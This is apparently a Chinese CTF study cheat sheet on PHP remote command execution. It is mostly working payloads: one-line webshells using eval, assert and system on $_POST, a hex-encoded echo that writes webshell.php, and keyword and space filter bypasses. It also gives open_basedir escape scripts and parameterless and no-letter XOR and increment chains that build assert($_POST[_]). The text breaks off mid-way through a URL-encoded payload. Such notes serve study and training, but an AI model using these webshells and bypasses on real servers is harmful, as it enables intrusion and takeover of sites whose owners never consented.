# RCE


&gt; 参考文章：
&gt; [【web安全】——命令执行漏洞（RCE）详解](https://blog.csdn.net/qq_63844103/article/details/126953630)\
&gt; [RCE总结](https://blog.csdn.net/weixin_46706771/article/details/119008895?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169383565116800184198616%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169383565116800184198616&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-119008895-null-null.142^v93^control&amp;utm_term=rce&amp;spm=1018.2226.3001.4187)
## 漏洞分类

* 代码层过滤不严
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：
```
system(&#34;/bin/program --arg $arg&#34;);
```
* 系统的漏洞造成命令注入
比如：bash破壳漏洞
* 调用的第三方组件存在代码执行漏洞
 如：wordPress中用来处理图片的imageMagick组件、JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）、ThinkPHP5.x的命令执行

## PHP可能存在命令执行漏洞的函数
**利用系统函数实现命令执行的函数**

* eval（）

  * 传入的参数必须为PHP代码，既需要以分号结尾

* assert（）

  * 最好不要加上分号作为结尾
  * `&lt;?php @assert($_POST[&#39;cmd&#39;])?&gt;`

* preg_replace（&#39;正则规则&#39;,&#39;替换字符&#39;，&#39;目标字符&#39;）

  * `preg_replace(&#34;/test/e&#34;,$_POST[&#34;cmd&#34;],&#34;jutst test&#34;);`

* call_user_func（）

  * `&lt;?php @assert($_POST[&#39;cmd&#39;])?&gt;`

* create_function()

  * 
    创建匿名函数执行代码
  * 执行命令和上传文件参考eval函数(必须加分号)
  * `&lt;?php $func =create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);$func(); ?&gt;`

* array_map()

  * ```
    &lt;?php
        $func=$_GET[&#39;func&#39;];
        $cmd=$_POST[&#39;cmd&#39;];
        $array[0]=$cmd;
        $new_array=array_map($func,$array);
        echo $new_array;
    ?&gt;
    ```

  * 菜刀连接`http://localhost/123.php?func=assert`   密码：cmd

* call_user_func_array()

* array_filter()

* uasort()

如果页面中存在以上这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞，除此以外还有其他函数。

* ob_start（）

* unserialize（）

* creat_function（） 

* usort（）

* uasort（）

  * php环境&gt;=&lt;5.6才能用
  * uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。
  *  命令执行：`http://localhost/123.php?1=1&#43;1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);_`
  * 菜刀连接：`http://localhost/123.php?1=1&#43;1&amp;2=eval($_POST[cmd])`   密码：cmd
    &lt;?php
        usort($_GET,&#39;asse&#39;.&#39;rt&#39;);
    ?&gt;
  * 

* uksort（）

* array_filter（）

  * ```
    &lt;?php
        $cmd=$_POST[&#39;cmd&#39;];
        $array1=array($cmd);
        $func =$_GET[&#39;func&#39;];
        array_filter($array1,$func);
    ?&gt;
    ```

* array_reduce（）

* array_map（）

  * ```
    &lt;?php
        $func=$_GET[&#39;func&#39;];
        $cmd=$_POST[&#39;cmd&#39;];
        $array[0]=$cmd;
        $new_array=array_map($func,$array);
        echo $new_array;
    ?&gt;
    ```


**直接执行系统命令的代码函数**

* system（）
  * 将字符串作为OS命令执行，自带输出功能

* exec（）
  * 将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。
  * `&lt;?php echo exec($_POST[&#34;cmd&#34;]);?&gt;`

* shell_exec（）
  * 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容
  * `&lt;?php echo shell_exec($_POST[&#34;cmd&#34;]); ?&gt;`

* passthru（）
  * 将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容

* pcntl_exec（）
  * `&lt;?php pcntl_exec(&#34;/bin/bash&#34;,array($_POST[&#34;cmd&#34;])); ?&gt;`

* popen（）、proc_open（）
  * 该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数
  * `&lt;?php $handle = popen(&#34;/bin/ls&#34;,&#34;r&#34;);?&gt;`

* 反引号
  * `&lt;?php $handle = popen(&#34;/bin/ls&#34;,&#34;r&#34;);?&gt;`


## 命令拼接符号
* Windows
```
&amp;	A&amp;B	无论A是false还是true，B都执行，即互不影响
```
```
&amp;&amp;	A&amp;&amp;B	具有短路效果，A是false，B就不执行，有短路效果
```
```
|	A|B	表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行
```
```
||	A||B	表示A命令语句执行失败，然后才执行B命令语句
```
```
cmd1 | cmd2	//无论cmd1是否执行成功，cmd2一定执行
cmd1 ; cmd2	//无论cmd1是否执行成功，cmd2一定执行
cmd1 &amp; cmd2	//无论cmd1是否执行成功，cmd2一定执行
cmd1 || cmd2	//仅在cmd1执行失败时，cmd2被执行
cmd1 &amp;&amp; cmd2	//尽仅在cmd1执行成功时，cmd2被执行
```

* Linux

```
&amp;       命令后面跟上一个空格和 ‘&amp;’，可执行多个语句，直到kill -s
```
```
;      可以进行多条命令的无关联执行，每条执行结果互不影响
```
```
&amp;&amp;  ||     与Windows中相同
```
```
()      如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用圆括号()把所有命令组合起来
```

## 命令绕过
### 过滤cat,flag等关键词
1. 代替
```
more:一页一页的显示档案内容 // 后面的指令要用 `` 包住
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，可以查看
vim:一种编辑器，可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
sh /flag 2&gt;%261  //报错出文件内容
exa:替代ls
```
```
// 常用指令
more `dir`

more `php -r php -r &#34;echo chr(102).chr(49).chr(97).chr(103);&#34;` //echo flag
```

2. 使用转义符

```
ca\t /fl\ag
cat fl&#39;&#39;ag
```
3. 内联执行绕过
```
a=fl;b=ag.php;cat$IFS$a$b
```
4. 变量绕过
```
a=c;b=a;c=t;$a$b$c 1.txt
```
5. 编码进制绕过
16进制&amp;base64编码

6. 利用正则匹配绕过
例：
过滤/1010/flag.php文件
```
cat 1010/flag.php
cat ????/fla*
```

7. 利用未初始化变量，使用$u绕过
```
cat 1010/flag.php
cat 1010$u/flag.php
```

8. 引号绕过（flag过滤）

   ```
   f&#34;&#34;lag
   f&#39;&#39;lag
   ```

* 命令执行函数system()绕过
  system(“whoami”)

1. 十六进制
```
“\x73\x79\x73\x74\x65\x6d”(“whoami”);
```
2. 括号绕过
```
(sy.(st).em)(whoami);
```
3. 使用内敛执行代替system
```
echo `ls`;
echo $(ls);
?&gt;&lt;?=`ls`;
?&gt;&lt;?=$(ls);
```
* 使用∗ 和 *和∗和@，x , x,x,{数字}
因为在没有传参的情况下，上面的特殊变量都是为空的
```
ca$*t 1010/flag.php
ca$@t 1010/flag.php
ca$2t 1010/flag.php
ca${39}t 1010/flag.php
```
* 	其它文件读取方式
```
curl file:///root/1010/flag.php
strings 1010/flag.php
uniq -c 1010/flag.php
bash -v 1010/flag.php
rev 1010/flag.php
```
* dir与ls的代替
find 列出当前目录下的文件以及子目录所有文件

### 过滤空格
```
%09（url传递）(cat%09flag.php)
${IFS}
$IFS$9
&lt;&gt;（cat&lt;&gt;/flag）
&lt;（cat&lt;/flag）
{cat,flag}
```
### 过滤目录分隔符 (/)
采用多个管道命令
```
;cd flag;cat *
```

### 过滤分隔符 | &amp; ;
可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号
```
功能	                     符号	                         payload
```
```
换行符	                     %0a	                        ?cmd=123%0als
回车符	                     %0d	                        ?cmd=123%0dls
连续指令	              ;	                                ?1=123;pwd
后台进程	              &amp;	                                ?1=123&amp;pwd
管道                          |	                                ?1=123|pwd
逻辑运算	            ||或&amp;&amp;	                        ?1=123&amp;&amp;pwd
```

### ?&gt; 代替 ;
在php中可以用?&gt;来代替最后一个`;`因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。

### 字符串长度受限
使用touch来生成文件，然后将生成的文件名拼凑成一句命令，最后执行，达到目的
```
&lt;-- cat flag.php --&gt;
替换：
touch &#34;hp&#34;
touch &#34;g.p\\&#34;
touch &#34;la\\&#34;
touch &#34;t f\\&#34;
touch &#34;ca\\&#34;
ls -t
ls -t &gt;a 将 ls -t 内容写入到a文件中
sh a
```
```
\是指换行
ls -t将文件按时间排序输出
sh命令可以从一个文件中读取命令来执行
```

### 无回显

* shell_exec等无回显函数

  * 判断

    ```
    ls;sleep 5
    ls / | sleep 5
    ```

  * 打印结果

    ```
    ?cmd=ls / | tee 1.txt
    ?cmd=ls / &gt; 1.txt
    ```

    
```
//复制，压缩，写shell等方法
copy flag.php flag.txt
mv flag.php flag.txt
cat flag.php &gt; flag.txt
```
```
//压缩方法
tar cvf flag.tar flag.php #tar压缩
tar zcvf flag.tar.gz flag.php  #tar解压
zip flag.zip flag.php  #zip压缩
unzip flag.zip  #zip解压
```
```
// 写shell方法【echo &#34;&lt;?php @eval(\$_POST[123]); ?&gt;&#34; &gt; webshell.php】
// 3c3f706870206576616c28245f504f53545b3132335d293b203f3e是&lt;?php eval($_POST[123]); ?&gt;的十六进制编码
echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php
```

### 取反绕过

&gt; 一般用于无字母RCE

```PHP
&lt;?php
echo urlencode(~&#39;system&#39;);
echo &#34;\n&#34;;
echo urlencode(~&#39;cat /flllllaaaaaaggggggg&#39;);
?&gt;
```

```
?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98); 
# ?wllm=system(ls /);
```

### eval执行时用了php的结束标志?&gt;绕过

&gt; 源码显示：`eval(&#34;?&gt;&#34;. $word);`

* `&lt;? echo &#39;123&#39;;?&gt;`

  但前提是前提是开启配置参数short_open_tags=on

* `&lt;script language=&#34;php&#34;&gt;echo &#39;hello&#39;;`

  不需要修改参数开关，但是只能在7.0以下可用

* `&lt;% echo &#39;123&#39;;%&gt;`

  开启配置参数`asp_tags=on`，并且只能在7.0以下版本使用

### 直接执行命令函数ban

如果禁用system,exec等直接执行命令函数，可以用file_put_contents函数绕过

```
file_put_contents(&#39;1.php&#39;,&#39;&lt;?php eval($_POST[&#39;aa&#39;]);?&gt;&#39;);
```

写入一个文件

### open_basedir绕过

获取目录

```
&lt;?php
    print_r(ini_get(&#39;open_basedir&#39;).&#39;&lt;br&gt;&#39;);
    $dir_array = array();
    
    $dir = new DirectoryIterator(&#39;glob:///*&#39;);
    foreach($dir as $d){
        $dir_array[] = $d-&gt;__toString();
    }
    
    $dir = new DirectoryIterator(&#39;glob:///.*&#39;);
    foreach($dir as $d){
        $dir_array[] = $d-&gt;__toString();
    }
    
    sort($dir_array);
    foreach($dir_array as $d){
        echo $d.&#39; &#39;;
    }
?&gt;
```

```
&lt;?php
print_r(ini_get(&#39;open_basedir&#39;).&#39;&lt;br&gt;&#39;);
$dir_array = array();

$dir = new FilesystemIterator(&#39;glob:///*&#39;);
foreach($dir as $d){
    $dir_array[] = $d-&gt;__toString();
}

$dir = new FilesystemIterator(&#39;glob:///.*&#39;);
foreach($dir as $d){
    $dir_array[] = $d-&gt;__toString();
}

sort($dir_array);
foreach($dir_array as $d){
    echo $d.&#39; &#39;;
}
show_source(__FILE__);

?&gt;
```

读取文件

```
&lt;?php
    show_source(__FILE__);
    print_r(ini_get(&#39;open_basedir&#39;).&#39;&lt;br&gt;&#39;);
    
    mkdir(&#39;test&#39;);
    chdir(&#39;test&#39;);
    ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
    chdir(&#39;..&#39;);
    chdir(&#39;..&#39;);
    chdir(&#39;..&#39;);
    ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
    
    echo file_get_contents(&#39;/etc/hosts&#39;);

?&gt;
```

```
&lt;?php
    show_source(__FILE__);
    
    mkdir(&#34;1&#34;);chdir(&#34;1&#34;);
    mkdir(&#34;2&#34;);chdir(&#34;2&#34;);
    mkdir(&#34;3&#34;);chdir(&#34;3&#34;);
    mkdir(&#34;4&#34;);chdir(&#34;4&#34;);
    
    chdir(&#34;..&#34;);chdir(&#34;..&#34;);chdir(&#34;..&#34;);chdir(&#34;..&#34;);
    
    symlink(&#34;1/2/3/4&#34;,&#34;tmplink&#34;);
    symlink(&#34;tmplink/../../../../etc/hosts&#34;,&#34;bypass&#34;);
    unlink(&#34;tmplink&#34;);
    mkdir(&#34;tmplink&#34;);
    echo file_get_contents(&#34;bypass&#34;);
?&gt;
```



## 无参数RCE

### 特征

```
if(&#39;;&#39; === preg_replace(&#39;/[^\W]&#43;\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;star&#39;])) {    
    eval($_GET[&#39;star&#39;]);
}
```

匹配一个或多个非标点的符号字符

### 相关函数

* scandir() 

  将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）

* localeconv()

  返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）

* current()

  返回数组中的单元，默认取第一个值。pos()和current()是同一个东西

* getcwd()

  取得当前工作目录

* dirname()

  函数返回路径中的目录部分

* array_flip() 

  函数返回路径中的目录部分

* array_rand()

  从数组中随机取出一个或多个单元

* array_reverse()

  将数组内容反转

* strrev()

  用于反转给定字符串

* getcwd()

  获取当前工作目录路径

* dirname()

  函数返回路径中的目录部分。

* chdir()

  函数改变当前的目录。

* eval()、assert()

  命令执行

* hightlight_file()、show_source()、readfile()

  读取文件内容

* 数组移动操作

  * end() ： 将内部指针指向数组中的最后一个元素，并输出
  * next() ：将内部指针指向数组中的下一个元素，并输出
  * prev() ：将内部指针指向数组中的上一个元素，并输出
  * reset() ： 将内部指针指向数组中的第一个元素，并输出
  * each() ： 返回当前元素的键名和键值，并将内部指针向前移动

### 解法一: scandir()

&gt; 执行语句:`eval($GET[&#39;exp&#39;])`

```
var_dump(localeconv()); =&gt; .
var_dump(current(localeconv())); =&gt; ls
var_dump(scandir(current(localeconv()))); =&gt; ls /
```

一般这个时候出根目录下的文件是用string数组出的，如果我们需要把读取的文件名靠后，则使用数组移动的工具迁移其位置

```
var_dump(arry_reverse(scandir(current(localeconv())))); =&gt; ls /		# (倒序输出查询到的根目录)
```

然后直接读取文件就可以回显内容

```
highlight_file(next(arry_reverse(scandir(current(localeconv()))))); =&gt; cat /flag	# flag在第二个文件
```

灵活使用的payload

```
highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
  //查看和读取根目录文件
  //查看和读取根目录文件
```

### 解法二: session_id

&gt; 执行语句:`eval($GET[&#39;exp&#39;])`

&gt; [!IMPORTANT]
&gt;
&gt; 使用条件是session_start()已被开启

#### hex2bin()

自己手动对命令进行十六进制编码，后面在用函数hex2bin()解码转回去，使得后端实际接收到的是恶意代码。

我们把想要执行的命令进行十六进制编码后，替换掉`Cookie:PHPSESSID=`后面的值为要执行的恶意代码。

```
hex2bin(session_id(session_start()))
```

#### 读文件

如果已知文件名，把文件名写在PHPSESSID后面

```
readfile(session_id(session_start()));
```

### 解法三: getallheaders()

&gt; 执行语句:`eval($GET[&#39;exp&#39;])`

可以返回所有的请求头信息，但是局限于Apache

在请求头最后一行里面加入一个自己定义的参数，把恶意代码放在那

在执行命令时截取最后一行

```
var_dump(end(getallheaders()));
```

### 解法四: get_defined_vars()

&gt; 执行语句:`eval($GET[&#39;exp&#39;])`

相较于解法三，这个普遍性更强，可以回显全局变量

返回数组顺序为`$_GET--&gt;$_POST--&gt;$_COOKIE--&gt;$_FILES`

确认是否有回显：

```
print_r(get_defined_vars());
```

假如说原本只有一个参数a，那么可以多加一个参数b，后面写入恶意语句

```
a=eval(end(current(get_defined_vars())));&amp;b=system(&#39;ls /&#39;);
```

eval换成assert也行

### 解法五: chdir() &amp;array_rand()赌狗读文件

&gt; 实在不能rce，目录遍历文件读取

获取当前目录

```
var_dump(getcwd());
```

结合dirname()列出当前工作目录的父目录中的所有文件和目录

```
var_dump(scandir(dirname(getcwd())));
```

 读上一级文件名

```
?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
```

读根目录

ord() 函数和 chr() 函数：只能对第一个字符进行转码，ord() 编码，chr)解码，有概率会解码出斜杠读取根目录

```
?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
```

要用chdir()固定，payload

```
 ?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));
```

通过bp的intruder模块来读到根目录

UA头Safari后面的数字要1-10000爆破

## 无数字字母rce

### 取反

```php
&lt;?php
$a = urlencode(~&#39;phpinfo&#39;);
echo $a;
echo &#39;&lt;/br&gt;&#39;;
$b = ~urlencode($a);
echo $b;
```

### 异或

```python
valid = &#34;1234567890!@$%^*(){}[];\&#39;\&#34;,.&lt;&gt;/?-=_`~ &#34;

answer = str(input(&#34;请输入进行异或构造的字符串：&#34;))

tmp1, tmp2 = &#39;&#39;, &#39;&#39;
for c in answer:
  for i in valid:
    for j in valid:
      if (ord(i) ^ ord(j) == ord(c)):
        tmp1 &#43;= i
        tmp2 &#43;= j
        break
    else:
      continue
    break
print(&#34;tmp1为:&#34;,tmp1)
print(&#34;tmp2为:&#34;,tmp2)
```

利用例子：

```
var_dump(&#39;#&#39;^&#39;|&#39;); 		//得到字符 _
var_dump(&#39;.&#39;^&#39;~&#39;); 		//得到字符 P    
var_dump(&#39;/&#39;^&#39;`&#39;); 		//得到字符 0    
var_dump(&#39;|&#39;^&#39;/&#39;); 		//得到字符 S    
var_dump(&#39;{&#39;^&#39;/&#39;); 		//得到字符 T    
$__=(&#34;#&#34;^&#34;|&#34;).(&#34;.&#34;^&#34;~&#34;).(&#34;/&#34;^&#34;`&#34;).(&#34;|&#34;^&#34;/&#34;).(&#34;{&#34;^&#34;/&#34;);  		//变量$__值为字符串&#39;_POST&#39;
```

payload

```
&lt;?php
$_ = &#34;!((%)(&#34;^&#34;@[[@[\\&#34;;   //构造出assert
$__ = &#34;!&#43;/((&#34;^&#34;~{`{|&#34;;   //构造出_POST
$___ = $$__;   //$___ = $_POST
$_($___[_]);   //assert($_POST[_]);
```

&gt; 由于我们的Payload中含有一些特殊字符，我们我们需要对Payload进行一次URL编码

### 自增

`$&#43;&#43;`对变量进行了自增操作,由于我们没有定义的值，PHP会给赋一个默认值`NULL==0`

通过这个原理，可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字

```
&#34;A&#34;&#43;&#43; =&gt; &#34;B&#34;
&#34;B&#34;&#43;&#43; =&gt; &#34;C&#34;
```

那所有的字符都从a开始

在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为&#34;Array&#34;。再取这个字符串的第一个字母，就可以获得&#34;A&#34;

```
&lt;?php
$a = &#39;&#39;.[];
var_dump($a);
```

在不使用任何数字的情况下，通过对未定义变量的自增操作来得到一个数字

```
&lt;?php
$_=[].&#39;&#39;;   	//得到&#34;Array&#34;
$___ = $_[$__];   	//得到&#34;A&#34;，$__没有定义，默认为False也即0，此时$___=&#34;A&#34;
$__ = $___;   	//$__=&#34;A&#34;
$_ = $___;   	//$_=&#34;A&#34;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;   	//得到&#34;S&#34;，此时$__=&#34;S&#34;
$___ .= $__;   	//$___=&#34;AS&#34;
$___ .= $__;   	//$___=&#34;ASS&#34;
$__ = $_;   	//$__=&#34;A&#34;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;   //得到&#34;E&#34;，此时$__=&#34;E&#34;
$___ .= $__;   //$___=&#34;ASSE&#34;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__;$__&#43;&#43;;   //得到&#34;R&#34;，此时$__=&#34;R&#34;
$___ .= $__;   //$___=&#34;ASSER&#34;
$__&#43;&#43;;$__&#43;&#43;;   //得到&#34;T&#34;，此时$__=&#34;T&#34;
$___ .= $__;   //$___=&#34;ASSERT&#34;
$__ = $_;   //$__=&#34;A&#34;
$____ = &#34;_&#34;;   //$____=&#34;_&#34;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;   //得到&#34;P&#34;，此时$__=&#34;P&#34;
$____ .= $__;   //$____=&#34;_P&#34;
$__ = $_;   //$__=&#34;A&#34;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;   //得到&#34;O&#34;，此时$__=&#34;O&#34;
$____ .= $__;   //$____=&#34;_PO&#34;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;   //得到&#34;S&#34;，此时$__=&#34;S&#34;
$____ .= $__;   //$____=&#34;_POS&#34;
$__&#43;&#43;;   //得到&#34;T&#34;，此时$__=&#34;T&#34;
$____ .= $__;   //$____=&#34;_POST&#34;
$_ = $$____;   //$_=$_POST
$___($_[_]);   //ASSERT($_POST[_])
```

放到一行`ASSERT($_POST[_])`

```
$_=[];$_=@&#34;$_&#34;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$___.=$__;$___.=$__;$__=$_;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$___.=$__;$__=$_;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$___.=$__;$__=$_;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$___.=$__;$____=&#39;_&#39;;$__=$_;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$____.=$__;$__=$_;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$____.=$__;$__=$_;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$____.=$__;$__=$_;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$____.=$__;$_=$$____;$___($_[_]);
```

url编码`ASSERT($_POST[_])`

```
%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3